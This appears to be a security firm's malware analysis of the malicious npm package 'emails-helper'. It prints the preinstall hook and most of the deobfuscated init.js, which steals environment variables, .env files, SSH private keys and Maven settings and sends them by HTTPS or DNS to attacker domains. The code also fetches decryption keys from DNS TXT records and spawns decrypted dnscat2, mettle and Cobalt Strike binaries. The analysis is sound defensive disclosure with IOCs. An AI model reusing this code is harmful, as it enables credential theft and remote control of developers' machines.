@@ -1,0 +1,420 @@
+
+On the morning of August 24, Phylum's automated risk detection system identified a suspicious package published to npm called “emails-helper." A deeper investigation revealed that this package was part of an intricate attack involving Base64-encoded and encrypted binaries. The scheme fetches encryption keys from a DNS TXT record hosted on a remote server. Additionally, a hex-encoded URL is retrieved from this remote server and then passed to the spawned binaries. The end result is the deployment of powerful penetration testing tools such as dnscat2, mettle, and Cobalt Strike Beacon. In this article, we'll delve into the details of this sophisticated attack.
+Background
+We saw two versions of “emails-helper” published. The first was published on the morning of August 24 with benign code. There was a preinstall hook executing a file directly, but there was nothing malicious in it, just what appeared to be some test code the attacker was using to verify the hook was working as expected. In fact, the package itself looked like it could have actually been a very simplistic email validator, much as the package name suggests. Our assumption is the minimal legitimate code that does exist in the package was lifted from elsewhere.
+Then, 6.5 hours later, we saw a new version published with very different code. The package itself increased from 1.2kB to 3.5MB, and we saw the introduction of a “binaries” folder that, strangely, contained what looked like six different executables with a “.txt” extension (more on that later) and a minified and (arguably) obfuscated init.js file.
+TL;DR
+Before we delve into the intricate mechanics of this attack, let’s start with a concise summary:
+
+A malicious package named “emails-helper” was published to npm. Upon installation, it automatically executes a malicious file called init.js.
+The executed file establishes communication with a remote server to siphon off sensitive developer data, including configuration files and SSH keys.
+Data exfiltration is attempted via HTTP, and if this fails, the attacker reverts to exfiltrating data via DNS.
+C2 URLs and encryption keys are retrieved from a remote server, either via HTTP or a DNS TXT record.
+Base64-encoded and encrypted binaries that are shipped with the package are then decoded, decrypted, and silently spawned in the background.
+The binaries deploy penetration testing tools like dnscat2, mettle, and Cobalt Strike Beacon.
+
+The attack chain
+As mentioned above, the attack chain starts in the package.json file. Let’s take a brief look there.
+{
+  "name": "emails-helper",
+  "version": "2.0.20230824114134",
+  "description": "A javascript library to validate email address against different formats.",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "node init.js"
+  },
+  "repository": "<https://github.com/everydellei/emails-helper>",
+  "author": "Eric Verydellei",
+  "license": "MIT"
+}
+In this particular case, the attacker is automatically executing the init.js file from the preinstall hook upon installation.
+The init.js file is minified and, when properly formatted, comes in at around 300 lines. The file in its entirety can be found at the end of this write-up, but for now, we’ll break it down one chunk at a time. Starting from the top, we have a single self-invoking anonymous function, which means this entire thing is executed upon definition.
+Several additional dependencies are included.
+const e = require("dns"),
+    t = require("https"),
+    c = require("path"),
+    o = require("fs"),
+    h = require("os"),
+    s = require("crypto"),
+    l = require("child_process")["spawn"],
+    f = require("crypto")["pbkdf2"];
+  var r = require("dns").promises["Resolver"];
+Note the requirements of the dns package and the crypto package. Next, they retrieve platform information and configure some DNS resolver options, which will be used later.
+const d = process.platform,
+    u = new r({ timeout: 2e4, tries: 2 }),
+    n = "9p4jApni66uf6g9pn33ybbCy8wv7LAECWN2Ex6Z7Y1aD4hYTbA",
+    a = "linglink.lu",
+    p = "pout.autistan.lu",
+    g = "linglink.lu";
+The attacker sets up pertinent variables containing a future date and other constants.
+r = new Date("2023-09-15T18:00:00.000Z");
+  const m = "binaries";
+  let y = !1;
+  const E = "aes-128-ecb";
+  let v = "";
+Following this are three function definitions we’ll explore as we get closer to where they are used. Beyond those, they enter an if block but ONLY if the time of execution is less than the date defined above. That means this code will only execute before 2023-09-15T18:00:00.000Z. In other words, it has a built-in expiration date. Here’s the platform and environment check:
+if (
+  (function () {
+    if (!["linux", "win32"].includes(d)) return !0;
+    let e = !1;
+    if ("win32" === d) {
+      var t = process.env.COMPUTERNAME;
+      null != t && (e = /^[a-fA-F0-9]+$/.test(t));
+    } else {
+      try {
+        o.statSync("/.dockerenv"), (e = !0);
+      } catch {
+        e = !1;
+      }
+      if (!e)
+        try {
+          e = o.readFileSync("/proc/self/cgroup", "utf8").includes("docker");
+        } catch {
+          e = !1;
+        }
+    }
+    return e;
+  })()
+);
+This block is used to determine if the subsequent code should execute based on platform characteristics. In short, it will execute if the platform is "win32", the COMPUTERNAME environment variable exists, and its value matches a specific regex pattern (hexadecimal characters). Additionally, if the environment is running in a Docker container, the code will also execute. Note that the “win32” platform identifier in a Node.js environment accounts for 64-bit and 32-bit architectures.
+If the conditions above are met, the following is then executed:
+var x = (function () {
+  let e = null;
+  try {
+    let i = {},
+      t = process.env,
+      r = [],
+      n = "",
+      a =
+        (Object.keys(t).forEach(function (e) {
+          (n = (n = t[e]).replaceAll("\\\\", "/")), r.push(e + "=" + n);
+        }),
+        (i.PROCESS_ENV = r),
+        []);
+    process.argv.forEach((e, t) => {
+      a.push(e);
+    }),
+      (i.PROCESS_ARGS = a),
+      [
+        "",
+        "dev",
+        "test",
+        "staging",
+        "recette",
+        "preprod",
+        "pprod",
+        "prod",
+        "prd",
+      ].forEach((e) => {
+        let t = __dirname + "/../../.env";
+        if ((0 < e.length && (t = t + "." + e), o.existsSync(t)))
+          try {
+            var r = o.readFileSync(t, { encoding: "utf8", flag: "r" });
+            i["DOTENV_" + e.toUpperCase()] = r.replaceAll("\\n", "[NEWLINE]");
+          } catch (e) {}
+      });
+    const s = h.homedir + "/.ssh";
+    if (o.existsSync(s))
+      try {
+        o.readdirSync(s).forEach((e) => {
+          try {
+            var t = o.readFileSync(s + "/" + e, {
+              encoding: "utf8",
+              flag: "r",
+            });
+            t.toUpperCase().includes("PRIVATE")
+              ? (i["PRIVATEKEY_" + e] = t.replaceAll("\\n", "[NEWLINE]"))
+              : e.toUpperCase().includes("AUTHORIZED_KEYS") &&
+                (i.AUTHORIZED_KEYS = t.replaceAll("\\n", "[NEWLINE]"));
+          } catch (e) {}
+        });
+      } catch (e) {}
+    const l = h.homedir + "/.m2";
+    if (o.existsSync(l))
+      try {
+        ["settings.xml", "settings-security.xml"].forEach((e) => {
+          try {
+            var t = o.readFileSync(l + "/" + e, {
+              encoding: "utf8",
+              flag: "r",
+            });
+            i["MAVEN_" + e] = t.replaceAll("\\n", "[NEWLINE]");
+          } catch (e) {}
+        });
+      } catch (e) {}
+    var c = JSON.stringify(i);
+    e = Buffer.from(c, "utf8").toString("hex");
+  } catch (e) {}
+  return e;
+})();
+This block starts by extracting the process’s environment variables. It then iterates through them, storing normalized information about each one. The process’s command line arguments are similarly collected. The code then proceeds to handle environment-specific files named after various environments, such as "dev," "test," and so on. It’s interesting to note that among these environment names is "recette" which is French for “recipe”—presumably a common name for a development environment stage among French-speaking developers. Regardless, for each environment, it attempts to read and process files such as .env, SSH-related files, and sensitive Maven configuration information, gathering their contents. Finally, all extracted data is collected into a JSON structure and hex-encoded and stored in the variable x.
+If that collected data structure is not empty, meaning things of interest to the attacker were found, then the following block is executed:
+if (null != x && 0 < x.length) {
+  var C = x;
+  try {
+    var N = "" + C,
+      T = {
+        hostname: g,
+        port: 443,
+        path: "/",
+        method: "POST",
+        checkServerIdentity: function (e, t) {},
+        agent: !1,
+        headers: {
+          "X-Client-ID": n,
+          "X-Platform": d,
+          "Content-Type": "application/pdf",
+          "Content-Length": N.length,
+        },
+      },
+      I = t.request(T, (e) => {
+        200 != e.statusCode && (e.statusCode, A(C));
+      });
+    I.on("error", (e) => {
+      A(C);
+    }),
+      I.write(N),
+      I.end();
+  } catch (e) {
+    A(C);
+  }
+}
+In a strange variable name shuffle, the variable C is assigned the value of x, and the contents of C are stored in a variable N. An HTTP request is then constructed targeting a specific hostname g (previously defined as "linglink.lu") on port 443 with the "X-Client-ID" header assigned n (previously defined as 9p4jApni66uf6g9pn33ybbCy8wv7LAECWN2Ex6Z7Y1aD4hYTbA) and the "X-Platform" header as assigned d as defined earlier. It’s interesting to note that the "Content-Type” header is "application/pdf". A callback function is provided to handle the response from the server. It appears that if the server responds with a 200, nothing explicitly happens. However, If the response status code is not 200, it calls A(C). It will also call A(C) if there is an error during the request or in the case of any other exceptions. A is one of the functions defined earlier that we didn’t look at. Let’s take a look now.
+function A(r) {
+  try {
+    var n = r.match(/.{1,60}/g),
+      a = n.length,
+      c = [];
+    let e = "",
+      t = 1;
+    for (i = 0; i < a; i++)
+      (e += "." + n[i]),
+        3 === t ? (c.push(e.substring(1)), (e = ""), (t = 1)) : t++,
+        i === a - 1 &&
+          0 < e.length &&
+          ((e = e.substring(1)).indexOf(".") === e.lastIndexOf(".") &&
+            (e += ".202020"),
+          c.push(e));
+    var s = c.length;
+    for (i = 1; i <= s; i++)
+      !(function (e) {
+        try {
+          var t = 1e3 + 500 * (2 * Math.random() - 1);
+          setTimeout(() => {
+            u.resolve(e);
+          }, t);
+        } catch (e) {}
+      })(`${i}.${s}.${c[i - 1]}.` + p);
+  } catch (e) {}
+}
+It starts by taking the input r (remember r is now the hex-encoded JSON-serialized string of concatenated command-line arguments, file contents, and environment variables extracted earlier) and splits it into groups of 60 characters and stores the groups in the array n, the length of the array is stored in a. Then, it constructs a new array c with groups of up to 3 elements from n. Each group of three elements is concatenated into a string separated by dots. For some reason, perhaps to ensure the final string segment has a specific format or block structure, ".202020" padding is added to the last non-empty e if and only if e has only one segment (besides the leading dot).
+After constructing this new array, it enters a for loop that generates immediately invoked function expressions for each element. In this loop, setTimeout introduces a random delay between 500ms and 1500ms and then calls u.resolve(). u.resolve() is called with a string formed by concatenating the index of the loop, the total number of elements in the array c, the corresponding element from c and the string p which was previously defined as the URL "pout.autistan.lu". So, what ultimately ends up getting passed to u.resolve() would take the form of something like <loop_index>.<length_of_c>.<value_of_c>.pout.autistan.lu.
+It’s worth noting what’s actually happening here. In the previous block, the attacker is attempting data exfiltration over HTTP. In the case that anything fails in the request or the try block, data exfiltration is then attempted via DNS!
+Now, let’s back out to where we were. Let’s check out the else block that is run when nothing interesting is found on the machine, and x ends up being null or having a length of zero. Here’s the block:
+else {
+  setInterval(() => {
+    y && process.exit(0);
+  }, 5e3);
+  try {
+    var _ = {
+      hostname: g,
+      port: 443,
+      path: "/",
+      method: "GET",
+      checkServerIdentity: function (e, t) {},
+      agent: !1,
+      headers: { "X-Client-ID": n, "X-Platform": d },
+    };
+    t.get(_, (e) => {
+      let i = "";
+      e.on("data", (e) => {
+        i += e.toString();
+      }),
+        e.on("end", () => {
+          let t = !1,
+            r = "";
+          0 < i.length &&
+            i.split("\\n").forEach((e) => {
+              e = e.trim();
+              e.startsWith("KEY=") && (v = e),
+                e.startsWith(d + "=") && ((t = !0), (r = e));
+            }),
+            t ? S(r, "HTTP") : w();
+        });
+    }).on("error", (e) => {
+      w();
+    });
+  } catch (e) {
+    w();
+  }
+}
+The setInterval function sets up a loop that runs every 5 seconds. Inside the loop, it checks if y is truthy (it was initially defined earlier as let y = !1; or in other words false), and if it is, process.exit(0) is called. Otherwise, every 5 seconds, it’ll keep working through the try/catch block. Immediately in the try block, an HTTP GET request is attempted to "linglink.lu" on port 443 with the same headers as the POST request to the other URL we looked at earlier.
+During this request, it accumulates incoming data chunks into a string, i. Once the request ends, i is parsed to search for special lines. If a line starts with "KEY=", it sets an encryption key in the variable v. If a line starts with a platform identifier stored in d, it extracts that line's value, which, when decoded reveals the URL pics2.autistan.lu. This URL is likely used for further communication with a C2 server. Depending on these conditions, either a function S(r, "HTTP") is called with the parsed line and the string "HTTP", or a fallback function w() is invoked. If any errors occur, w() is called.
+w() is also called if any exceptions are thrown during the try block. Let’s take a look at w():
+function w() {
+  try {
+    e.resolveTxt(a, (e, r) => {
+      if (null === e) {
+        let t = "";
+        r.forEach((e) => {
+          e[0].trim().startsWith("KEY=") &&
+            e.forEach((e) => {
+              v += e.trim();
+            }),
+            e[0].trim().startsWith(d + "=") &&
+              e.forEach((e) => {
+                t += e.trim();
+              });
+        }),
+          S(t, "DNS");
+      }
+    });
+  } catch (e) {}
+}
+The first thing this function does is call e.resolveTxt(a, (e, r)). e was defined earlier as e = require("dns") so they’re calling the resolveTxt() function from the dns library with the argument a which was defined earlier as the hostname "linglink.lu". According to the dns docs:
+resolveTxt(hostname, callback)
+TXT
+hostname
+Now, this is interesting. Why would this package be asking for TXT records from a random hostname? Let’s keep going. If null === e meaning no errors occurred during DNS resolution, they then iterate through each DNS TXT record and for each one:
+
+Check if the first entry in the record starts with "KEY=" , and if so, it iterates through all the entries in that TXT record, trims them, and appends them to the existing value of v which was defined earlier as an empty string. (These are the encryption keys for the encrypted binaries.)
+Check if the first entry in the record starts with d + "=" where d was defined earlier as the system’s platform. If this is true, it iterates through all the entries in that TXT record, trims them, and appends them to the value t also defined earlier as a blank string. (These are hex-ended strings that, when decoded, reveal the URL pics2.autistan.lu , which is eventually passed to the spawned binary — this is, presumably, the C2 server.)
+Finally, it calls S(t, "DNS"). Let’s go take a look at S now.
+function S(e, t) {
+  try {
+    if (0 < (e = e.trim()).length) {
+      var r = Buffer.from(e.split("=")[1].trim(), "hex").toString().trim();
+      if (0 < r.length) {
+        let e =
+          "" + c.resolve(__dirname, m, d) + t.substring(0, 1).toLowerCase();
+        "win32" === d && (e += ".exe");
+        var i = (e = e.includes(" ") ? `"${e}"` : e);
+        if (0 != v.trim().length) {
+          if (!o.existsSync(i)) {
+            var n = s.createDecipheriv(E, v.split("=")[1].trim(), null);
+            let e = i.replaceAll('"', "") + ".txt",
+              t =
+                ((e = e.includes(" ") ? `"${e}"` : e),
+                o.readFileSync(e, { encoding: "utf8", flag: "r" }));
+            t = t.replaceAll("\\n", "").replaceAll("\\r", "").trim();
+            var a = Buffer.from(t, "base64"),
+              a = Buffer.concat([n.update(a), n.final()]);
+            o.writeFileSync(i, a), e;
+          }
+          "win32" !== d &&
+            l("chmod +x " + i.trim(), [], {
+              detached: !0,
+              stdio: "ignore",
+              windowsHide: !0,
+              shell: !0,
+            }),
+            "darwin" === d &&
+              l("xattr -d com.apple.quarantine " + i.trim(), [], {
+                detached: !0,
+                stdio: "ignore",
+                windowsHide: !0,
+                shell: !0,
+              });
+        }
+        e = e + " " + r;
+        l(e.trim(), [], {
+          detached: !0,
+          stdio: "ignore",
+          windowsHide: !0,
+          shell: !0,
+        });
+        f("secret", "salt", 2e6, 64, "sha512", (e, t) => {}), (y = !0);
+      }
+    }
+  } catch (e) {
+    y = !0;
+  }
+The function S(e, t) serves as the central mechanism for various tasks, including data validation, decryption, and file execution. It starts by validating its input parameters e and t, trimming any whitespace from e and checking its length. If valid, it proceeds to decode a part of e, which is hexadecimal-encoded. For file execution, the function crafts a file path by combining directory paths and conditionally appending ".exe" for Windows platforms. It then checks for the existence of a decryption key in the variable v. If v is not empty, it decrypts the content of the accompanying .txt file stored in the binaries folder at that path, writes it back as an executable, and modifies file permissions based on the operating system. Specifically for macOS, it removes the "quarantine" attribute from the file. Subsequently, it appends the decrypted value r to the constructed file path and executes this new command. Although a cryptographic operation using PBKDF2 is performed, its result is not used. The flag y is then set to true, both as a regular flow and as an error-catching mechanism. Overall, this function takes the Base64-encoded and encrypted binaries shipped with the package, fetches the decryption key from a remote server, decrypts the pertinent binary, writes it back to disk, and then executes it!
+The question begs…
+What’s in those binaries?! During our investigation and reconnaissance, we were able to obtain the encryption keys from the remote server and successfully decrypt the binaries. Interestingly enough, the Linux binaries were not stripped, and a quick check with Ghidra looks like they have something to do with dnscat2 and mettle. According to their respective READMEs, dnscat2
+and mettle is
+For those who don’t know, Meterpreter is an extensible payload that comes as part of the Metasploit Framework which is an open-source penetration testing and vulnerability assessment tool that aids in finding and exploiting vulnerabilities.
+Furthermore, the decoded text section in the VirusTotal report for the “win32d.exe” binary highlights a JSON-encoded configuration or metadata blob that appears to have been embedded within the binary in an encoded form. The decoded blob takes the following form:
+{
+  "BeaconType": [
+    "Hybrid HTTP DNS"
+  ],
+  "Port": 1,
+  "SleepTime": 60000,
+  "MaxGetSize": 1398107,
+  "Jitter": 39,
+  "MaxDNS": 255,
+  "C2Server": "pics.autistan.lu,/api/v1/Update",
+  "DNS_Idle": "8.8.8.8",
+  "DNS_Sleep": 0,
+  "HttpGet_Verb": "GET",
+  "HttpPost_Verb": "POST",
+  "HttpPostChunk": 0,
+  "Spawnto_x86": "%windir%\\\\syswow64\\\\gpupdate.exe",
+  "Spawnto_x64": "%windir%\\\\sysnative\\\\gpupdate.exe",
+  "CryptoScheme": 0,
+  "Proxy_Behavior": "Use IE settings",
+  "Watermark": 366786978,
+  "bStageCleanup": "True",
+  "bCFGCaution": "False",
+  "KillDate": 0,
+  "bProcInject_StartRWX": "True",
+  "bProcInject_UseRWX": "False",
+  "bProcInject_MinAllocSize": 16700,
+  "ProcInject_PrependAppend_x86": [
+    "kJCQ",
+    "Empty"
+  ],
+  "ProcInject_PrependAppend_x64": [
+    "kJCQ",
+    "Empty"
+  ],
+  "ProcInject_Execute": [
+    "ntdll.dll:RtlUserThreadStart",
+    "SetThreadContext",
+    "NtQueueApcThread-s",
+    "kernel32.dll:LoadLibraryA",
+    "RtlCreateUserThread"
+  ],
+  "ProcInject_AllocationMethod": "VirtualAllocEx",
+  "bUsesCookies": "True",
+  "HostHeader": ""
+}
+This looks remarkably like a Cobalt Strike Beacon configuration file. Cobalt Strike is another tool commonly used for red teaming and penetration testing and provides features for establishing C2 channels and executing payloads on compromised systems.
+Attack chain recap
+Let’s take a second to recap everything we just learned. From a high level, the attacker chain is as follows:
+
+A user runs npm install on a package called emails-helper
+A preinstall hook in the package.json file immediately runs init.js
+init.js, through a minified, obfuscated, and very complex piece of codeis passed encryption keys and the C2 server URL from a remote serversensitive machine information and files are extracted and encodedthat data is exfiltrated via HTTP, and if unsuccessful, it is exfiltrated via DNSdecodes and decrypts binaries shipped with the packagelaunches the appropriate binary as quietly as possible and then shuts down
+
+is passed encryption keys and the C2 server URL from a remote server
+sensitive machine information and files are extracted and encoded
+that data is exfiltrated via HTTP, and if unsuccessful, it is exfiltrated via DNS
+decodes and decrypts binaries shipped with the package
+launches the appropriate binary as quietly as possible and then shuts down
+Summary
+This latest incident marks another intricate supply chain attack aimed at JavaScript developers. Usually, such attacks offer some clues as to the specific developers or organizations being targeted. However, in this case, there are no such indicators. The malware package, named "emails-helper," appears to have a remarkably generic and broad scope, especially given its data exfiltration techniques and deployment of powerful tools like dnscat2, mettle, or Cobalt Strike Beacon. This is particularly striking given the sophisticated mechanism involved: retrieving encryption keys and C2 server URLs via DNS TXT records, then decrypting and executing the binary on the fly.
+The attack is a vivid reminder of the critical importance of vetting your dependencies. A simple action like running npm install can set off this elaborate attack chain, making it imperative for developers to exercise caution and due diligence as they carry out their software development activities.
+IOCs
+URLs
+
+autistan[.]lu
+linglink[.]lu
+Binary Hashes
+Decrypted binaries
+
+34a86ec79c04b13ccb5c5279241cc3dfb6e91a48c3497703c9d757b10a8abc8c
+b7c6d3dcd962cc33cd12a21bec9a40470f9a42577a2ba89c97bd28cdc95945b5
+d68a94343dff8444afe6208ad1377639ddd3667d28839a40c22a1e3112d1e335
+bb9d4d127fffb12c3d386ea3671a446cf181fb03d08b20b1e9e1675f83471ec3
+66c4640dcdab0c746c71a3d72002791f0567379ccfea685cac05d4cde3c36926
+246c6637a8b514e55390468ed36b46e4e5563c08cc035723a6fbe66b54537cdb
+Encrypted binaries (as seen in the package archive)
+
+ca7bc3b201c71eff6f8f8cf5bd79e53116b4eeea3040789e16e09a53050e73c5
+869164886ee65add713d19ee36780f5b3c80209259bddb2667666319d78028c5
+d1b8d72c450a44d27ac22a7dfc4808f0700ac03ee90c31ea6208a21664e1fd43
+bbd4c83ac3b0c1c944c0bb2767e45f65b37b7ce634ae61932fbe0e2b549cdf9e
+ee6bfc0e1531e120a63ddd95232e9330d7cae29c43233f604736e3bf374cf48c
+651c369596ae985b7b5fda53b5c8884cf4cfe273b4661495afc2d1a91e809890
